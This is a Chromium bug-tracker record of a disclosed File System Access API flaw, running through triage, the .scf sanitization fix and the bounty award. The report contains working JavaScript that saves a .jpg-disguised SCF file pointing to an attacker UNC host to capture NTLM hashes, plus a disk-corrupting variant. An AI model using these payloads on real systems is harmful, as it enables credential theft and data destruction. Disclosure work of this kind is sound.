# Security: Ability to mask file type with another extention. IE JPEG

| Field | Value |
|-------|-------|
| **Issue ID** | [40056478](https://issues.chromium.org/issues/40056478) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Storage>FileSystem |
| **Platforms** | Windows |
| **Reporter** | da...@gmail.com |
| **Assignee** | as...@chromium.org |
| **Created** | 2021-07-10 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

A threat actor has the ability to mask a malicous file extention in the latest version of Google Chrome as another file extention. In my example, I was able to create a SFC file type masked as a jpg that points to my responder server. This allowed myself to be able to capture a users windows NTLM hash (test account) on the latest stable version of Google chrome without having to even opening the file. Everything points to this file being a jpg but it's automaticly sending data to the threat actor with no acknowledment of the user.

**VERSION**  

Chrome Version: 91.0.4472.124, stable  

Operating System: Windows 10 20H2 build 19042.867

**REPRODUCTION CASE**  

Attached is the video of the bug in use as well as the HTML webpage used to execute the bug. I've removed the IP in the HTML code.

PoC:  

<script>  

const butSaveNewFile = document.getElementById('addNewFile')  

butSaveNewFile.addEventListener('mouseup', async () => {  

const options = {  

types: [  

{  

description:  

'JPEG (\*.jpg,\*.jpeg,\*.jpe,\*.jiff)',  

accept: {  

'text/plain': ['.jpg.scf']  

}  

}  

],  

excludeAcceptAllOption: false  

}

```
        const handle = await window.showSaveFilePicker(options)  
        const writable = await handle.createWritable()  
        await writable.write('[Shell]\n')  
        await writable.write('Command=2\n')  
        await writable.write('IconFile="//IPSanitized/frostb1te/poc.ico"')  
        await writable.write('\n[Taskbar]\n')  
        await writable.write('Command=ToggleDesktop\n')  
        await writable.close()  
    })                                                                                                                                                                                                                                                                                    
</script>  

```

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: Daniel Rhea

## Attachments

- [VideoProof.mkv](attachments/VideoProof.mkv) (application/octet-stream, 2.4 MB)
- [DownloadIMG.html](attachments/DownloadIMG.html) (text/plain, 1.5 KB)
- [2021-07-11 11-39-11.mkv](attachments/2021-07-11 11-39-11.mkv) (application/octet-stream, 3.1 MB)

## Timeline

### [Deleted User] (2021-07-10)

[Empty comment from Monorail migration]

### da...@gmail.com (2021-07-11)

11JUL **showing right click ability, along side with believable image.**

### rs...@chromium.org (2021-07-12)

Thanks for the report. This seems similar to https://crbug.com/chromium/1137247.

[Monorail components: Blink>Storage>FileSystem]

### [Deleted User] (2021-07-12)

[Empty comment from Monorail migration]

### da...@gmail.com (2021-07-12)

Did the bug reintroduce? I happen to be on the latest version of chrome. Looks like they took the .lnk method but this time around is letting me save SCF extentions that can steal the victems NTLM hash with less user interaction. Thanks for showing!

### da...@gmail.com (2021-07-13)

This snippit will also cause a harddrive to corrupt 


            const writable = await handle.createWritable()
            await writable.write('[Shell]\n')
            await writable.write('Command=2\n')
            await writable.write('IconFile="C:\:$i30:$bitmap"')
            await writable.write('\n[Taskbar]\n')
            await writable.write('Command=ToggleDesktop\n')
            await writable.close()

A large threat for this is that the SCF file doesn't need to open to start it. Being in the same directory will cause it to trigger thus only requiring the user to save it, not even open it.

### [Deleted User] (2021-07-13)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### da...@gmail.com (2021-07-15)

Tested on latest update Version 91.0.4472.164 (Official Build) (64-bit). Still vulnerable and very dangerous due to ability to steal NTLM hashes without having to open the file.

### [Deleted User] (2021-07-25)

asully: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### da...@gmail.com (2021-07-25)

Tested on Version 92.0.4515.107 (Official Build) (64-bit). Still vulnerable and was able to obtain test account's NTLM hash. 

### [Deleted User] (2021-08-05)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-06)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-06)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-06)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-07)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-08)

asully: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### me...@chromium.org (2021-08-11)

I don't think the problem is that the user might not know what file extension a file gets (because what users really understand the difference between various extensions, especially if they've configured windows to hide file extensions by default). But the fact that we let you write .scf files does seem bad. I guess in the case of regular downloads this was "fixed" by adding a warning (https://crbug.com/chromium/722524) when downloading such files, but here we don't really have that option.

As such I think we should add .scf to the list of "bad" extensions in our copy of IsShellIntegratedExtension.

### me...@chromium.org (2021-08-11)

https://crbug.com/chromium/722524 also makes it sound like to actually exploit this you have to disable a bunch of default windows security features, so perhaps like that bug this should also be Security_Severity_Low? (unless our definitions of what is high or low have changed over the years of course).

### da...@gmail.com (2021-08-11)

[Comment Deleted]

### da...@gmail.com (2021-08-11)

Just tried on a fresh Windows 10, fully updated and the latest Chrome without any modifications of the security settings and it was still vulnerable. 

### [Deleted User] (2021-08-16)

[Empty comment from Monorail migration]

### do...@chromium.org (2021-09-03)

Security marshall ping: mek, do you mind following up with the status of this?

### [Deleted User] (2021-09-09)

We commit ourselves to a 60 day deadline for fixing for high severity vulnerabilities, and have exceeded it here. If you're unable to look into this soon, could you please find another owner or remove yourself so that this gets back into the security triage queue?

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-09-11)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-22)

[Empty comment from Monorail migration]

### [Deleted User] (2021-11-15)

[Empty comment from Monorail migration]

### da...@gmail.com (2021-11-29)

Are there any updates on this case? Thank you!

### pw...@chromium.org (2021-12-06)

This seems similar to https://crbug.com/chromium/1140417 (forked from https://crbug.com/chromium/1137247) where we blocked .lnk and .local. I think we should block .scf in the short term, while we figure out something better.

.scf seems to be used by some legitimate applications (DNA data?), so it'd be great to have a better long-term plan -- perhaps we can get away with blocking the more subtle extensions only when double-extensions (multiple dots in the extension) are used?

### da...@gmail.com (2021-12-06)

Yeah it appears the extension scf is used for DNA sequencing, and a couple Chromatogram applications and may cause conflicts if it was solely blocked. The double-extension .*.scf method would be a good resolution.  

### as...@chromium.org (2021-12-07)

I had put together a CL (https://crrev.com/c/3089422) a while back blocking .scf files on Windows, but never landed it. It had some strange behavior because .scf files are not sanitized by net::GenerateFileName(), unlike .lnk and .local files. 

The current state of suggested name and extension sanitization is unnecessarily complicated, in my opinion. There are some odd discrepancies between how suggestedName and extensions are sanitize. For example. on non-Windows OSes, .local and .lnk extensions are stripped from the "accepts" list of extensions, but suggesting a file with a .local or .lnk extension is not sanitized. (we strip .local and .lnk extensions from "accepts" on all OSes, but net::GenerateFileName() only sanitizes these files on Windows.)

I touched up the CL to make this behavior more consistent (only strip .local and .lnk extensions from "accepts" on Windows) and to replace extensions ourselves to augment net::GenerateFileName() (we could consider changing this method, but that might have other side effects).

As written, it sanitizes both .scf and .*.scf files (only on Windows) but I'm happy to update this if we feel blocking non-compound extensions is not a good idea.

### da...@gmail.com (2022-01-03)

Thanks for sharing Asully! It's nice to see how the Chrome developers work on the inside. :) 

### [Deleted User] (2022-02-02)

[Empty comment from Monorail migration]

### ke...@chromium.org (2022-02-14)

asully@: Friendly security sheriff ping. Is there anything in currently blocking that CL other than code review?

### as...@chromium.org (2022-02-15)

Apologies for the lack of activity here. We're in active discussion with the security team and should have an update here shortly.

### da...@gmail.com (2022-03-07)

No problem at all. :)

### me...@chromium.org (2022-03-18)

[Empty comment from Monorail migration]

### ad...@google.com (2022-03-28)

asully@ could we have an update here on the discussions you mention in https://crbug.com/chromium/1227995#c34?

### [Deleted User] (2022-03-30)

[Empty comment from Monorail migration]

### as...@chromium.org (2022-04-06)

[Empty comment from Monorail migration]

### bo...@google.com (2022-04-20)

Hi there, this is your friendly Security Marshall checking in. Did the discussion in https://crbug.com/chromium/1227995#c34 already happen? If not, I can offer my calendar appointment booking services for the low, low price of you telling me who needs to be involved to get things unstuck. :)

### bo...@chromium.org (2022-04-20)

Quick update after chatting with @asully out of band:

The discussion referenced in https://crbug.com/chromium/1227995#c34 happened some weeks ago and notes are captured in [1]. (@google.com only)

To summarize, the chosen approach to address this bug is to add a prompt when saving a file with a dangerous extension. However, progress implementing the fix is slower than desired due to personnel changes. 

Additionally, entries were just added to the Security FAQ via crrev.com/c/3590905 to clarify the threat model and what Chrome tries to do to be helpful.

[1] https://docs.google.com/document/d/1WMh6iw_r_4mBN2iJfDkr1Aevichyr472kDbPKl80K00/edit?resourcekey=0-UWSDns1SzeN3eHy0u5WWZA#

### ay...@chromium.org (2022-04-27)

[Empty comment from Monorail migration]

### ay...@chromium.org (2022-04-28)

[Empty comment from Monorail migration]

### as...@chromium.org (2022-04-28)

[Empty comment from Monorail migration]

### as...@chromium.org (2022-04-28)

https://crbug.com/1320877 tracks the status of this new prompt

### gi...@appspot.gserviceaccount.com (2022-05-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/988164c6c4a563c3d4c0dedba295d09472dfc15f

commit 988164c6c4a563c3d4c0dedba295d09472dfc15f
Author: Austin Sullivan <asully@chromium.org>
Date: Wed May 11 17:12:45 2022

FSA: Sanitize .scf files

.scf files can be used to execute code without opening the file.
Sanitize these files the same way we sanitize .lnk files.

Also updates filename sanitization logic to be consistent in blocking
.lnk and .local extensions on all OSes.

Bug: 1227995
Change-Id: I4b018f1ba524c783547e18630db9addc9fb126e6
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3089422
Reviewed-by: Marijn Kruisselbrink <mek@chromium.org>
Commit-Queue: Marijn Kruisselbrink <mek@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1002147}

[modify] https://crrev.com/988164c6c4a563c3d4c0dedba295d09472dfc15f/content/browser/file_system_access/file_system_chooser.cc
[modify] https://crrev.com/988164c6c4a563c3d4c0dedba295d09472dfc15f/content/browser/file_system_access/file_system_chooser.h
[modify] https://crrev.com/988164c6c4a563c3d4c0dedba295d09472dfc15f/content/browser/file_system_access/file_system_chooser_unittest.cc
[modify] https://crrev.com/988164c6c4a563c3d4c0dedba295d09472dfc15f/content/browser/file_system_access/file_system_access_directory_handle_impl.cc
[modify] https://crrev.com/988164c6c4a563c3d4c0dedba295d09472dfc15f/content/browser/file_system_access/file_system_access_manager_impl.cc
[modify] https://crrev.com/988164c6c4a563c3d4c0dedba295d09472dfc15f/content/browser/file_system_access/file_system_chooser_browsertest.cc


### as...@chromium.org (2022-05-12)

I'll mark this as closed since the API will no longer allow you to suggest .scf files for download

Note that if the user explicitly changes the extension in the file picker to be a .scf file, they'll still be able to download it

### [Deleted User] (2022-05-12)

[Empty comment from Monorail migration]

### [Deleted User] (2022-05-12)

[Empty comment from Monorail migration]

### [Deleted User] (2022-05-12)

Requesting merge to extended stable M100 because latest trunk commit (1002147) appears to be after extended stable branch point (972766).

Requesting merge to stable M101 because latest trunk commit (1002147) appears to be after stable branch point (982481).

Requesting merge to beta M102 because latest trunk commit (1002147) appears to be after beta branch point (992738).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-05-12)

Merge review required: M102 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), harrysouders (iOS), ceb (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-05-12)

Merge review required: M101 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: benmason (Android), harrysouders (iOS), matthewjoseph (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-05-12)

Merge review required: M100 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), harrysouders (iOS), dgagnon (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### as...@chromium.org (2022-05-12)

1. Why does your merge fit within the merge criteria for these milestones?

Security severity: high

2. What changes specifically would you like to merge? Please link to Gerrit.

https://crrev.com/c/3089422

3. Have the changes been released and tested on canary?

Yes

4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

No

5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents

N/A

6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Yes - see repro case above. The file should not be downloaded as an .scf

### am...@chromium.org (2022-05-13)

M102 merge approved, please merge this fix to branch 5005 as soon as possible/NLT EOD Monday, 16 May so this fix can be included in the M102 stable cut -- thank you

### am...@chromium.org (2022-05-14)

(merge-na M101/M100 as there are no further planned releases of M101 stable/M100 ES) 

### sr...@google.com (2022-05-16)

Please complete your merge to M102 ASAP, M102 RC cut is tomorrow  ( May 17) if you want your change to be part of the M102 stable promotion pls complete merges before EOD today PST ( May 16)

### as...@chromium.org (2022-05-16)

https://crrev.com/c/3648322 is making its way through the trybots as we speak :)

### gi...@appspot.gserviceaccount.com (2022-05-16)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/f1dd785e021eee989af8fbe7570f424e96cb0b16

commit f1dd785e021eee989af8fbe7570f424e96cb0b16
Author: Austin Sullivan <asully@chromium.org>
Date: Mon May 16 18:20:27 2022

M102: FSA: Sanitize .scf files

.scf files can be used to execute code without opening the file.
Sanitize these files the same way we sanitize .lnk files.

Also updates filename sanitization logic to be consistent in blocking
.lnk and .local extensions on all OSes.

(cherry picked from commit 988164c6c4a563c3d4c0dedba295d09472dfc15f)

Bug: 1227995
Change-Id: I4b018f1ba524c783547e18630db9addc9fb126e6
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3089422
Reviewed-by: Marijn Kruisselbrink <mek@chromium.org>
Commit-Queue: Marijn Kruisselbrink <mek@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1002147}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3648322
Auto-Submit: Austin Sullivan <asully@chromium.org>
Commit-Queue: Austin Sullivan <asully@chromium.org>
Cr-Commit-Position: refs/branch-heads/5005@{#759}
Cr-Branched-From: 5b4d9450fee01f821b6400e947b3839727643a71-refs/heads/main@{#992738}

[modify] https://crrev.com/f1dd785e021eee989af8fbe7570f424e96cb0b16/content/browser/file_system_access/file_system_chooser.cc
[modify] https://crrev.com/f1dd785e021eee989af8fbe7570f424e96cb0b16/content/browser/file_system_access/file_system_chooser.h
[modify] https://crrev.com/f1dd785e021eee989af8fbe7570f424e96cb0b16/content/browser/file_system_access/file_system_chooser_unittest.cc
[modify] https://crrev.com/f1dd785e021eee989af8fbe7570f424e96cb0b16/content/browser/file_system_access/file_system_access_directory_handle_impl.cc
[modify] https://crrev.com/f1dd785e021eee989af8fbe7570f424e96cb0b16/content/browser/file_system_access/file_system_chooser_browsertest.cc
[modify] https://crrev.com/f1dd785e021eee989af8fbe7570f424e96cb0b16/content/browser/file_system_access/file_system_access_manager_impl.cc


### am...@google.com (2022-05-16)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-05-16)

Congratulation, Daniel! The VRP Panel has decided to award you $2,000 for this report. A member of our finance team will reach out to you soon to arrange payment. Thank you for your efforts and reporting this issue to us! 

### da...@gmail.com (2022-05-16)

Thank you! :) I had a few quick questions also. Will this be eligible for an entry in the Google Hall of Fame (I think it was changed to Honorable mentions) and will it get a CVE assigned to it? I would love to have a CVE to my name. Once again thank you! 

### am...@chromium.org (2022-05-16)

Hi, 
>>>Will this be eligible for an entry in the Google Hall of Fame (I think it was changed to Honorable mentions)
Google HoF changed to the Bug Hunters Leaderboard [1] and there is also now an Honorable Mentions [2]. Honorable mentions is anyone that has submitted a valid security bug recently, so this should be eligible for that. You do need to have a bughunters account for this to occur, I believe. 

[1] https://bughunters.google.com/leaderboard
[2] https://bughunters.google.com/leaderboard/honorable-mentions

This issue will receive a CVE when the fix ships in a stable channel release. The CVE ID will be added to the report at that time. 
 

### am...@chromium.org (2022-05-24)

[Empty comment from Monorail migration]

### am...@google.com (2022-05-24)

[Empty comment from Monorail migration]

### am...@google.com (2022-05-24)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-07-21)

[Empty comment from Monorail migration]

### am...@google.com (2022-07-27)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-07-29)

[Empty comment from Monorail migration]

### [Deleted User] (2022-08-18)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1227995?no_tracker_redirect=1

[Monorail blocked-on: crbug.com/chromium/1320877]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40056478)*
